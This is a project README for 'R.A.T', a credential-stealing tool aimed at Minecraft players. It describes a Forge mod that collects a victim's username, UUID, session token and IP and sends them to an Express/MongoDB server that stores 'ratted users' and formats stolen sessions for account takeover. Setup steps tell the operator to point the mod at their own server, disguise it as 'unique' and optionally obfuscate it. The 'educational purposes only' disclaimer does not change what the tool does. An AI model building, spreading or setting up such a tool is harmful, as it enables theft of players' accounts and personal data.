<div align="center">

# R.A.T

<img src="https://bigrat.monster/media/bigrat.png" alt="logo" width="25%" />

**Retrieve Access Token**

![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)

</div>

> Check [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth) to login into an MC account with a name, token and uuid combo.

## Features
- Grabs the **username, uuid, token and ip** of a target as a *JSON*.
- JavaScript Backend server which:
  - Checks if the token is valid before adding to the database.
  - Checks if all fields in the json are present.
  
  therefore filtering out spam requests.
  
- Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).

- Can be easily be hosted on *Heroku*.

- Uses:
  - *MongoDB* for for storing ratted users.
  - *Express* for the backend server.

## Setup
- Server
  1. Clone the repository.
  2. Install dependencies.
  3. Create a .env file with your database url.
  3. Run the server (don't forget to change some strings).

- Mod
  1. Follow [1.8.9ForgeTemplate#setup](https://github.com/DxxxxY/1.8.9ForgeTemplate#setup) to setup your mod environment.
  2. Change url to your server and change some other stuff to make it ✨unique✨.
  3. Build the mod.
  4. (Optional) Obfuscate the mod.

## Disclaimer
This is for educational purposes only. I am not responsible for any damage caused by this tool.

## License
GPLv3 © dxxxxy